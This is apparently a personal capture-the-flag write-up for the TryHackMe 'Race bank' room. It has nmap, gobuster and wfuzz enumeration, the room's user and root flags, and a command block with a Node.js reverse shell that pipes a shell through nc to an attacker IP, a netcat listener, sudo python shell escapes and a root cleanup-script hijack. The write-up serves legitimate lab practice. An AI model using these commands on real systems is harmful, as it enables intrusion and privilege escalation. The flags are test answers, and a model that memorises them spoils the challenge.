---
cssclasses:
  - jbm-note
Date: 2026-07-10
tags:
  - THMChallenge
---
# **THM** Challenge

| **Target** :LiTarget:            | *Try hack me machine(room:Race bank)* |
| -------------------------------- | ------------------------------------- |
| Date :LiCalendar:                | 10/07/2026                            |
| Main attack type                 | Python scripting                      |
| Secondary attack type            | RCE                                   |
| Tools :LiToolCase:               | NMAP, Python scripting, GOBUSTER      |
| Criticality :RiAlarmWarningLine: | **9**, **Critical** - RCE             |

---
# **RESULTS**
---
## Flags/Tasks
### Task 1
1. User flag
	- *THM{178c31090a7e0f69560730ad21d90e70}*
2. ROOT flag
	- *THM{55a9d6099933f6c456ccb2711b8766e3}*

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
```
require(“child_process”).exec(‘rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc insertyourIPhere 1337 >/tmp/f’)
```
```
rlwrap nc -nvlp 1337 
```
```
sudo python3 -c 'import os; os.execl("/bin/sh", "sh")'
```
```
python3 -c 'import os; os.execl("/bin/sh", "sh")'
```
```js
require("child_process").exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.145.193 1337 >/tmp/f')
```
```
mv cleanupscript.sh cleanupscript.sh.bak
```
```
echo 'cat /root/root.txt > /home/brian/root.txt' > cleanupscript.sh > cleanupscript.sht.txt > /home/brian/root.txt
```
---
# Preparation
---
## Resources
- Resources / Information provided in-room
- [CVE-2017-0213](https://github.com/SecWiki/windows-kernel-exploits/blob/master/CVE-2017-0213/CVE-2017-0213_x64.zip) - Python exploit script
- RDP Software : `xfreerdp` (Pre-installed in Kali)
## Python script
---
# Initial investigation/enumeration
---
## **Enumeration**
### NMAP
#### Simple scan
```bash
sudo nmap -sS -sV TARGET
```
```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
#### ALL Ports
```bash
sudo nmap -sS -p- TARGET
```
```
unnecessary
```
### GOBUSTER
#### Hidden endpoint
```bash
gobuster dir -u http://TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 200
```
```
```bash
images            (Status: 301) [Size: 179] [ -- > /images/]
Images            (Status: 301) [Size: 179] [ -- > /Images/]
IMAGES            (Status: 301) [Size: 179] [ -- > /IMAGES/]
bootstrap         (Status: 301) [Size: 185] [ -- > /bootstrap/]

/create.html (Status: 200)
/home.html (Status: 302)
/Home.html (Status: 302)
/images (Status: 301)
/Images (Status: 301)
/Index.html (Status: 200)
/index.html (Status: 200)
/index.html (Status: 200)
/login.html (Status: 200)
/Login.html (Status: 200)
/purchase.html (Status: 302)
/bootstrap (Status:301)
```
### Robots.txt
```
no robots.txt endpoint
```
### WFUZZ exploit
```
wfuzz -u http://TARGET/api/givegold -H "Content-Type: application/x-www-form-urlencoded" -b "connect.sid=CookieY" -d "user=test&amount=FUZZ"
```

## **Vulnerability scanning**
### Research
- `npm` **`racetrack`** library
	- [npm package](https://www.npmjs.com/package/racetrack)

---
# Exploiting and Investigation
---
## Enumerating the server
After initial enumeration, the typical ports **`80`** and **`22`** are open. After opening the site, the page greets with two sign up / login options. Signing up gives you 1 free Gold. Logging in with SQLi seems to have no effect.



## User flag



## Root flag
